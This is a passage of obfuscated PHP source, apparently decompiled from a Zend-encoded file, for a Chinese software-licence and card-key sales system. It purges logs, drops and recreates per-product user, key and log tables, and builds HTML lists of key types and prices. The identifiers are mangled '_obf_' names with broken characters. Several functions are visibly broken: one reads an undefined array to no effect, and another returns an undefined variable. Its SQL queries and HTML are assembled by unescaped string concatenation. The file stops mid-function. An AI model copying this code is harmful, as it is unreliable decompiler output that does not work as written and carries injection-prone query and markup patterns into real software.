<?php

function _obf_j4iMi4_Tk42OjIaNkIiGkYs�( $_obf_jpKPlJSUiZOHkYaPlIeOiY4� = 1 )
{
    $_obf_iJGPjJWLj4uLkIqVjYiHh48� = unpack( "C*", "ViewZendSourceCodeIsInvalid!" );
    do
    {
        $_obf_iY2Oh5OGlIqQhpCJi5CMkog� = ( $_obf_lZKViImJjo6UhouJj4aVi4Y�[$_obf_jpKPlJSUiZOHkYaPlIeOiY4�] << 4 ) + ( $_obf_lZKViImJjo6UhouJj4aVi4Y�[$_obf_jpKPlJSUiZOHkYaPlIeOiY4� + 1] >> 4 );
        $_obf_jpKPlJSUiZOHkYaPlIeOiY4� += 2;
    } while ( $_obf_jpKPlJSUiZOHkYaPlIeOiY4� < 28 );
}

function _obf_jIeRipOPkpCSlY_HjZOKkYo�( )
{
    global $_obf_jIaUiIeSjZWKlIqLkIqOioc�;
    $_obf_joyNkZSPj5CNkIiUh4mLk4Y� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_lZGTiIiKhouKiZGLi5KUkI8�( "select * from kss_tb_soft" );
    foreach ( $_obf_joyNkZSPj5CNkIiUh4mLk4Y� as $_obf_kY_OlYeUlIiVjo6Hio_MkpI� )
    {
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "delete from `kss_z_log_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['pid']."_".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']."` where `addtime`<".( time( ) - 86400 * Z_LOG_DAY ), "sync" );
    }
}

function _obf_j4iOio6Jh46TiI6QkY_Hh5U�( )
{
    global $_obf_jIaUiIeSjZWKlIqLkIqOioc�;
    $_obf_kZWKiYiOkouSi5OPjI6Vio0� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iY6OkJCRkY2PjpCPk5CRkJA�( "select * from kss_tb_config where id=1" );
    if ( $_obf_kZWKiYiOkouSi5OPjI6Vio0�['clear_z_log'] != date( "d" ) )
    {
        $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "update kss_tb_config set clear_z_log=".date( "d" )." where `id`=1", "notsync" );
        $_obf_j4eSkIiSiZCRh4_NiYaQkYk� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_lZGTiIiKhouKiZGLi5KUkI8�( "select * from kss_tb_soft " );
    }
    return $_obf_lYeKk46VlJOHkZOGjZGIko8�;
}

function _obf_lImPlIqVi5SQjpOHkIyHi5Q�( $_obf_koeLiIiJjJOQlIaJi4aUh5A�, $_obf_jpKNh4aRh4aQkY2PlIuRhpE�, $_obf_h4mRiI2JlYmThoyOjIqQjok� )
{
    global $_obf_jIaUiIeSjZWKlIqLkIqOioc�;
    $_obf_j4eSkIiSiZCRh4_NiYaQkYk� = "";
    $_obf_lY6RhpOJh46VkJOGkoeRiIY� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "DROP TABLE IF EXISTS `kss_z_cz_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."`", "sync" );
    if ( $_obf_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obf_j4eSkIiSiZCRh4_NiYaQkYk� .= "删除旧的kss_z_cz_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."表出错".$_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obf_lY6RhpOJh46VkJOGkoeRiIY� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "CREATE TABLE `kss_z_cz_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."` (`id` int(11) unsigned NOT NULL auto_increment,`addtime` int(10) unsigned NOT NULL,`cztype` tinyint(2) unsigned NOT NULL,`username` varchar(32) character set utf8 collate utf8_bin NOT NULL,`oldcday` decimal(9,2) unsigned NOT NULL,`newcday` decimal(9,2) unsigned NOT NULL,`oldtimes` int(10) unsigned NOT NULL,`newtimes` int(10) unsigned NOT NULL,`keys` varchar(170) character set utf8 collate utf8_bin NOT NULL default '',`tzxguser` varchar(32) character set utf8 collate utf8_bin NOT NULL default '',  PRIMARY KEY  (`id`), KEY `addtime` (`addtime`), KEY `username` (`username`(10))) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='客户帐号时间变更日志' AUTO_INCREMENT=1 ", "sync" );
    if ( $_obf_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obf_j4eSkIiSiZCRh4_NiYaQkYk� .= "创建新的kss_z_cz_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."表出错".$_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obf_lY6RhpOJh46VkJOGkoeRiIY� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "DROP TABLE IF EXISTS `kss_z_key_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."`", "sync" );
    if ( $_obf_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obf_j4eSkIiSiZCRh4_NiYaQkYk� .= "删除旧的kss_z_key_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."表出错".$_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obf_lY6RhpOJh46VkJOGkoeRiIY� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "CREATE TABLE `kss_z_key_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."` (`id` int(10) unsigned NOT NULL auto_increment,`managerid` smallint(5) unsigned NOT NULL,`keyfix` char(4) character set utf8 collate utf8_bin NOT NULL,`keys` char(6) character set utf8 collate utf8_bin NOT NULL,`keyspassword` char(22) character set utf8 collate utf8_bin NOT NULL,`addtime` int(10) unsigned NOT NULL,`ordernum` char(24) character set utf8 collate utf8_bin NOT NULL,`cday` decimal(8,2) NOT NULL,`linknum` int(4) unsigned NOT NULL default '1',`points` int(8) unsigned NOT NULL default '0',`keyextattr` varchar(100) NOT NULL default '',`tag` varchar(50) character set utf8 collate utf8_bin NOT NULL default '',`islock` tinyint(1) unsigned NOT NULL default '0',`isback` tinyint(1) unsigned NOT NULL default '0',`cztime` int(10) unsigned NOT NULL default '0',`czusername` varchar(32) NOT NULL default '',PRIMARY KEY  (`id`),UNIQUE KEY `keys` (`keys`), KEY `ordernum` (`ordernum`(10)), KEY `keyextattr` (`keyextattr`(10)), KEY `tag` (`tag`(10)), KEY `czusername` (`czusername`(10)), KEY `islock` (`islock`), KEY `isback` (`isback`), KEY `keyfix_uid_cztime` (`keyfix`,`managerid`,`cztime`)) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ", "sync" );
    if ( $_obf_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obf_j4eSkIiSiZCRh4_NiYaQkYk� .= "创建新的kss_z_key_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."表出错".$_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obf_lY6RhpOJh46VkJOGkoeRiIY� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "DROP TABLE IF EXISTS `kss_z_key_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."_recycle`", "sync" );
    if ( $_obf_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obf_j4eSkIiSiZCRh4_NiYaQkYk� .= "删除旧的kss_z_key_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."_recycle表出错".$_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obf_lY6RhpOJh46VkJOGkoeRiIY� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "CREATE TABLE `kss_z_key_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."_recycle` (`id` int(10) unsigned NOT NULL auto_increment,`managerid` smallint(5) unsigned NOT NULL,`keyfix` char(4) character set utf8 collate utf8_bin NOT NULL,`keys` char(6) character set utf8 collate utf8_bin NOT NULL,`keyspassword` char(22) character set utf8 collate utf8_bin NOT NULL,`addtime` int(10) unsigned NOT NULL,`ordernum` char(24) character set utf8 collate utf8_bin NOT NULL,`cday` decimal(8,2) NOT NULL,`linknum` int(4) unsigned NOT NULL default '1',`points` int(8) unsigned NOT NULL default '0',`keyextattr` varchar(100) NOT NULL default '',`tag` varchar(50) NOT NULL default '',`islock` tinyint(1) unsigned NOT NULL default '0',`isback` tinyint(1) unsigned NOT NULL default '0',`cztime` int(10) unsigned NOT NULL default '0',`czusername` varchar(32) character set utf8 collate utf8_bin NOT NULL default '',`deltime` int(10) unsigned NOT NULL,`delmid` smallint(5) unsigned NOT NULL,PRIMARY KEY  (`id`),UNIQUE KEY `keys` (`keys`), KEY `ordernum` (`ordernum`(10)), KEY `keyextattr` (`keyextattr`(10)), KEY `tag` (`tag`(10)), KEY `czusername` (`czusername`(10)), KEY `islock` (`islock`), KEY `isback` (`isback`), KEY `deltime` (`deltime`),KEY `keyfix_uid_cztime` (`keyfix`,`managerid`,`cztime`)) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ", "sync" );
    if ( $_obf_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obf_j4eSkIiSiZCRh4_NiYaQkYk� .= "创建新的kss_z_key_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."_recycle表出错".$_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obf_lY6RhpOJh46VkJOGkoeRiIY� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "DROP TABLE IF EXISTS `kss_z_log_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."`", "sync" );
    if ( $_obf_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obf_j4eSkIiSiZCRh4_NiYaQkYk� .= "删除旧的kss_z_log_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."表出错".$_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obf_lY6RhpOJh46VkJOGkoeRiIY� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "CREATE TABLE `kss_z_log_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."` (`id` int(10) NOT NULL auto_increment,`username` varchar(32) character set utf8 collate utf8_bin NOT NULL,`optype` tinyint(2) unsigned NOT NULL,`clientid` smallint(5) unsigned NOT NULL,`addtime` int(10) unsigned NOT NULL,`ip` bigint(20) unsigned NOT NULL,`pccode` varchar(512) character set utf8 NOT NULL default '',`linecode` varchar(10) character set utf8 NOT NULL default '',`opccode` varchar(512) character set utf8 NOT NULL, `oip` bigint(20) unsigned NOT NULL default '0',PRIMARY KEY  (`id`),KEY `addtime` (`addtime`),KEY `keys` (`username`(10),`optype`,`clientid`)) ENGINE=MyISAM DEFAULT CHARSET=ascii AUTO_INCREMENT=1 ", "sync" );
    if ( $_obf_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obf_j4eSkIiSiZCRh4_NiYaQkYk� .= "创建新的kss_z_log_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."表出错".$_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obf_lY6RhpOJh46VkJOGkoeRiIY� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "DROP TABLE IF EXISTS `kss_z_user_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."`", "sync" );
    if ( $_obf_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obf_j4eSkIiSiZCRh4_NiYaQkYk� .= "删除旧的kss_z_user_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."表出错".$_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obf_lY6RhpOJh46VkJOGkoeRiIY� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "CREATE TABLE `kss_z_user_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."` (`id` int(10) unsigned NOT NULL auto_increment,`istempuser` tinyint(1) unsigned NOT NULL default '0',`managerid` smallint(5) unsigned NOT NULL default '0',`username` varchar(32) character set utf8 collate utf8_bin NOT NULL,`password` varchar(32) character set utf8 collate utf8_bin NOT NULL,`password2` varchar(32) character set utf8 collate utf8_bin NOT NULL,`cday` decimal(8,2) NOT NULL,`linknum` int(4) unsigned NOT NULL default '1',`points` int(8) NOT NULL default '0',`keyextattr` varchar(100) NOT NULL default '',`islock` int(1) unsigned NOT NULL default '0',`ispause` int(1) unsigned NOT NULL default '0',`pausetime` int(10) unsigned NOT NULL default '0',`hstats` int(10) unsigned NOT NULL default '0',`unlineday` int(10) unsigned NOT NULL default '0',`unlinetimes` int(10) unsigned NOT NULL default '0',`tag` varchar(100) character set utf8 collate utf8_bin NOT NULL default '-',`bdinfo` varchar(100) NOT NULL default '',`linecode` varchar(10) NOT NULL default '',`pccode` varchar(512) NOT NULL default '',`addtime` int(10) unsigned NOT NULL default '0',`starttime` int(10) unsigned NOT NULL default '0',`endtime` int(10) unsigned NOT NULL default '0',`lasttime` int(10) unsigned NOT NULL default '0',`isonline` tinyint(1) unsigned NOT NULL default '0',`lastip` bigint(20) unsigned NOT NULL default '0',`activetimes` int(10) unsigned NOT NULL default '0',`unlocktimes` int(10) unsigned NOT NULL default '0',`unlockday` tinyint(2) unsigned NOT NULL default '0',`cztimes` int(10) unsigned NOT NULL default '0',`isusetestkey` tinyint(1) unsigned NOT NULL default '0',`parentuser` varchar(100) NOT NULL default '',`intro` varchar(50) NOT NULL default '',`updata` varchar(128) NOT NULL default '',PRIMARY KEY  (`id`),KEY `username` (`username`(10)),KEY `managerid` (`managerid`),KEY `tag` (`tag`),KEY `keyextattr` (`keyextattr`),KEY `lasttime` (`lasttime`,`isonline`),KEY `islock` (`islock`),KEY `endtime` (`endtime`)) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ", "sync" );
    if ( $_obf_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obf_j4eSkIiSiZCRh4_NiYaQkYk� .= "创建新的kss_z_user_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."表出错".$_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obf_lY6RhpOJh46VkJOGkoeRiIY� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "DROP TABLE IF EXISTS `kss_z_user_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."_recycle`", "sync" );
    if ( $_obf_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obf_j4eSkIiSiZCRh4_NiYaQkYk� .= "删除旧的kss_z_user_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."_recycle表出错".$_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    $_obf_lY6RhpOJh46VkJOGkoeRiIY� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_kpSOj5KVio2Hj4uKj4_KjIY�( "CREATE TABLE `kss_z_user_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."_recycle` (`id` int(10) unsigned NOT NULL auto_increment,`istempuser` tinyint(1) unsigned NOT NULL default '0',`managerid` smallint(5) unsigned NOT NULL default '0',`username` varchar(32) character set utf8 collate utf8_bin NOT NULL,`password` varchar(32) character set utf8 collate utf8_bin NOT NULL,`password2` varchar(32) character set utf8 collate utf8_bin NOT NULL,`cday` decimal(8,2) NOT NULL,`linknum` int(4) unsigned NOT NULL default '1',`points` int(8) NOT NULL default '0',`keyextattr` varchar(100) NOT NULL default '',`islock` int(1) unsigned NOT NULL default '0',`ispause` int(1) unsigned NOT NULL default '0',`pausetime` int(10) unsigned NOT NULL default '0',`hstats` int(10) unsigned NOT NULL default '0',`unlineday` int(10) unsigned NOT NULL default '0',`unlinetimes` int(10) unsigned NOT NULL default '0',`tag` varchar(100) character set utf8 collate utf8_bin NOT NULL default '-',`bdinfo` varchar(100) NOT NULL default '',`linecode` varchar(10) NOT NULL default '',`pccode` varchar(512) NOT NULL default '',`addtime` int(10) unsigned NOT NULL default '0',`starttime` int(10) unsigned NOT NULL default '0',`endtime` int(10) unsigned NOT NULL default '0',`lasttime` int(10) unsigned NOT NULL default '0',`isonline` tinyint(1) unsigned NOT NULL default '0',`lastip` bigint(20) unsigned NOT NULL default '0',`activetimes` int(10) unsigned NOT NULL default '0',`unlocktimes` int(10) unsigned NOT NULL default '0',`unlockday` tinyint(2) unsigned NOT NULL default '0',`cztimes` int(10) unsigned NOT NULL default '0',`isusetestkey` tinyint(1) unsigned NOT NULL default '0',`parentuser` varchar(100) NOT NULL default '',`intro` varchar(50) NOT NULL default '',`updata` varchar(128) NOT NULL default '',`delmid` smallint(5) unsigned NOT NULL default '0',`deltime` int(10) unsigned NOT NULL default '0',PRIMARY KEY  (`id`),KEY `username` (`username`(10)),KEY `managerid` (`managerid`),KEY `tag` (`tag`),KEY `keyextattr` (`keyextattr`),KEY `lasttime` (`lasttime`,`isonline`),KEY `islock` (`islock`),KEY `endtime` (`endtime`)) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ", "sync" );
    if ( $_obf_lY6RhpOJh46VkJOGkoeRiIY� === FALSE )
    {
        $_obf_j4eSkIiSiZCRh4_NiYaQkYk� .= "创建新的kss_z_user_".$_obf_koeLiIiJjJOQlIaJi4aUh5A�."_".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�."_recycle表出错".$_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_iYmHkJSKj5OJhoiRiY2Rio4�( )."<br>";
    }
    if ( $_obf_j4eSkIiSiZCRh4_NiYaQkYk� == "" )
    {
        $_obf_j4eSkIiSiZCRh4_NiYaQkYk� = TRUE;
    }
    return $_obf_j4eSkIiSiZCRh4_NiYaQkYk�;
}

function _obf_lIuHjouPkIaTk46Ih5SVjIw�( $_obf_jpKNh4aRh4aQkY2PlIuRhpE�, &$_obf_i4eIkYmJiIyQk4iMj4iGh4o� )
{
    global $_obf_jIaUiIeSjZWKlIqLkIqOioc�;
    global $_obf_lI6OiJSPjZWVi5GQhoiPjpU�;
    $_obf_lYuNj46JkoyKjY_IjIiLj4Y� = "0000";
    if ( $_obf_jpKNh4aRh4aQkY2PlIuRhpE� == 0 )
    {
        return "<option value='".$_obf_lYuNj46JkoyKjY_IjIiLj4Y�."'>----暂无卡类----</option>";
    }
    $_obf_iYeIjIaVlYaIj4yTiJWHk40� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_lZGTiIiKhouKiZGLi5KUkI8�( "select * from `kss_tb_keyset` where `pid`=".$_obf_lI6OiJSPjZWVi5GQhoiPjpU�['pid']." and `softid`=".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�." and `islock`=0 order by `cday` asc" );
    if ( empty( $_obf_iYeIjIaVlYaIj4yTiJWHk40� ) )
    {
        return "<option value='".$_obf_lYuNj46JkoyKjY_IjIiLj4Y�."'>----暂无卡类----</option>";
    }
    $_obf_j42Hk5GMkZSNj42RipORkI4� = "";
    foreach ( $_obf_iYeIjIaVlYaIj4yTiJWHk40� as $_obf_kY_OlYeUlIiVjo6Hio_MkpI� )
    {
        $_obf_j42Hk5GMkZSNj42RipORkI4� .= "<option value='".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['prefix']."'";
        $_obf_j42Hk5GMkZSNj42RipORkI4� .= " cday='".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['cday']."'";
        $_obf_j42Hk5GMkZSNj42RipORkI4� .= " points='".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['points']."'";
        $_obf_j42Hk5GMkZSNj42RipORkI4� .= " linknum='".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['linknum']."'";
        $_obf_j42Hk5GMkZSNj42RipORkI4� .= "  extattr1='".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['extattr1']."'>";
        $_obf_j42Hk5GMkZSNj42RipORkI4� .= $_obf_kY_OlYeUlIiVjo6Hio_MkpI�['keyname']."--[天".round( $_obf_kY_OlYeUlIiVjo6Hio_MkpI�['cday'], 2 )." 点".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['points']." 通道".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['linknum'];
        if ( $_obf_kY_OlYeUlIiVjo6Hio_MkpI�['extattr1'] != "" )
        {
            $_obf_j42Hk5GMkZSNj42RipORkI4� .= " 附属性".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['extattr1'];
            $_obf_i4eIkYmJiIyQk4iMj4iGh4o�[$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['prefix']] = $_obf_kY_OlYeUlIiVjo6Hio_MkpI�['keyname']."--[天".round( $_obf_kY_OlYeUlIiVjo6Hio_MkpI�['cday'], 2 )." 点".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['points']." 通道".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['linknum']." 附属性".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['extattr1'];
        }
        else
        {
            $_obf_i4eIkYmJiIyQk4iMj4iGh4o�[$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['prefix']] = $_obf_kY_OlYeUlIiVjo6Hio_MkpI�['keyname']."--[天".round( $_obf_kY_OlYeUlIiVjo6Hio_MkpI�['cday'], 2 )." 点".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['points']." 通道".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['linknum'];
        }
        $_obf_j42Hk5GMkZSNj42RipORkI4� .= "]</option>";
    }
    return $_obf_j42Hk5GMkZSNj42RipORkI4�;
}

function _obf_lIeLiY6Gk4aNiY2Si4uJiIs�( $_obf_jpKNh4aRh4aQkY2PlIuRhpE�, $_obf_hoyPk5CJiZKVj4iLh5SHkJA� = 0, $_obf_iYiMh4aGkJCJk4qHjIiVi4Y� = 0, $_obf_kIiVkYqGk4aTjoyIiJGGlYo� = FALSE )
{
    global $_obf_jIaUiIeSjZWKlIqLkIqOioc�;
    global $_obf_lI6OiJSPjZWVi5GQhoiPjpU�;
    $_obf_lYuNj46JkoyKjY_IjIiLj4Y� = 0;
    if ( $_obf_iYiMh4aGkJCJk4qHjIiVi4Y� == 2 )
    {
        $_obf_lYuNj46JkoyKjY_IjIiLj4Y� = "";
    }
    if ( $_obf_jpKNh4aRh4aQkY2PlIuRhpE� == 0 )
    {
        return "<option value='".$_obf_lYuNj46JkoyKjY_IjIiLj4Y�."'>----暂无卡类----</option>";
    }
    $_obf_iYeIjIaVlYaIj4yTiJWHk40� = $_obf_jIaUiIeSjZWKlIqLkIqOioc�->_obf_lZGTiIiKhouKiZGLi5KUkI8�( "select * from `kss_tb_keyset` where `pid`=".$_obf_lI6OiJSPjZWVi5GQhoiPjpU�['pid']." and `softid`=".$_obf_jpKNh4aRh4aQkY2PlIuRhpE�." and `islock`=0 order by `cday` asc" );
    if ( empty( $_obf_iYeIjIaVlYaIj4yTiJWHk40� ) )
    {
        return "<option value='".$_obf_lYuNj46JkoyKjY_IjIiLj4Y�."'>----暂无卡类----</option>";
    }
    $_obf_j42Hk5GMkZSNj42RipORkI4� = "";
    if ( !empty( $_obf_kIiVkYqGk4aTjoyIiJGGlYo� ) )
    {
        $_obf_i4yIjo2QjpCViIqOiYiGkZE� = array( );
        foreach ( $_obf_kIiVkYqGk4aTjoyIiJGGlYo� as $_obf_i4yKj4eSi4mRkIqSkY6Piok� )
        {
            $_obf_i4yIjo2QjpCViIqOiYiGkZE�[$_obf_i4yKj4eSi4mRkIqSkY6Piok�['keygroupid']] = $_obf_i4yKj4eSi4mRkIqSkY6Piok�['keyprice'];
        }
        foreach ( $_obf_iYeIjIaVlYaIj4yTiJWHk40� as $_obf_kY_OlYeUlIiVjo6Hio_MkpI� )
        {
            if ( array_key_exists( $_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id'], $_obf_i4yIjo2QjpCViIqOiYiGkZE� ) )
            {
                $_obf_j42Hk5GMkZSNj42RipORkI4� .= "<option value=".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id'];
                $_obf_j42Hk5GMkZSNj42RipORkI4� .= $_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id'] == $_obf_hoyPk5CJiZKVj4iLh5SHkJA� ? " selected" : "";
                $_obf_j42Hk5GMkZSNj42RipORkI4� .= " cday='".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['cday']."'";
                $_obf_j42Hk5GMkZSNj42RipORkI4� .= " points='".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['points']."'";
                $_obf_j42Hk5GMkZSNj42RipORkI4� .= " linknum='".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['linknum']."'";
                $_obf_j42Hk5GMkZSNj42RipORkI4� .= " price='".$_obf_i4yIjo2QjpCViIqOiYiGkZE�[$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']]."'";
                $_obf_j42Hk5GMkZSNj42RipORkI4� .= "  extattr1='".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['extattr1']."'>";
                $_obf_j42Hk5GMkZSNj42RipORkI4� .= $_obf_kY_OlYeUlIiVjo6Hio_MkpI�['keyname']."--".$_obf_i4yIjo2QjpCViIqOiYiGkZE�[$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id']]."元/张 [天".round( $_obf_kY_OlYeUlIiVjo6Hio_MkpI�['cday'], 2 )." 点".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['points']." 通道".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['linknum'];
                if ( $_obf_kY_OlYeUlIiVjo6Hio_MkpI�['extattr1'] != "" )
                {
                    $_obf_j42Hk5GMkZSNj42RipORkI4� .= " 附属性".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['extattr1'];
                }
                $_obf_j42Hk5GMkZSNj42RipORkI4� .= "]</option>";
            }
        }
        return $_obf_j42Hk5GMkZSNj42RipORkI4�;
    }
    foreach ( $_obf_iYeIjIaVlYaIj4yTiJWHk40� as $_obf_kY_OlYeUlIiVjo6Hio_MkpI� )
    {
        if ( $_obf_iYiMh4aGkJCJk4qHjIiVi4Y� == 2 )
        {
            $_obf_j42Hk5GMkZSNj42RipORkI4� .= "<option value='".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['prefix']."'";
            $_obf_j42Hk5GMkZSNj42RipORkI4� .= $_obf_kY_OlYeUlIiVjo6Hio_MkpI�['prefix'] == $_obf_hoyPk5CJiZKVj4iLh5SHkJA� ? " selected" : "";
        }
        else
        {
            $_obf_j42Hk5GMkZSNj42RipORkI4� .= "<option value=".$_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id'];
            $_obf_j42Hk5GMkZSNj42RipORkI4� .= $_obf_kY_OlYeUlIiVjo6Hio_MkpI�['id'] == $_obf_hoyPk5CJiZKVj4iLh5SHkJA� ? " selected" : "";
        }
